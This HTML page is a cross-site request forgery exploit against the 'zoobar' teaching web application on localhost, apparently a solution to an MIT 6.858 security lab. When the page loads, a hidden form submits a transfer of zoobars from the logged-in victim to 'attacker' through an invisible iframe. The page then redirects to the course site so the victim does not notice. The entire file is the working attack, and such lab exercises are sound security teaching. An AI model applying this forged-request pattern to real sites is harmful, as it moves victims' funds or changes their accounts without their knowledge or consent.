<html>
    <body>
        <div id="myZoobars"
             style="display: none; visibility: hidden; height: 0; width: 0; position: absolute">
        </div>
        <iframe id="response_frame"
                style="display: none; visibility: hidden; height: 0; width: 0; position: absolute"
                name="response_frame"
                src="about:blank"
                width="0"
                height="0">
        </iframe>
        <form id="zoobar_stealer" method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer" target="response_frame">
            <input name="zoobars" type="hidden" value="1" />
            <input name="recipient" type="hidden" value="attacker" />
        </form>
        <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
        <script>
         if (!/[0-9]+/g.exec(document.getElementById('myZoobars').innerHTML))
             window.location.href = 'zoobar-login.html'
         else {
             document.getElementById("response_frame").addEventListener('load', (event) => {
                 window.location.href = 'http://css.csail.mit.edu/6.858/2014/';
             });

             document.getElementById("zoobar_stealer").submit();
         }
        </script>
    </body>
</html>
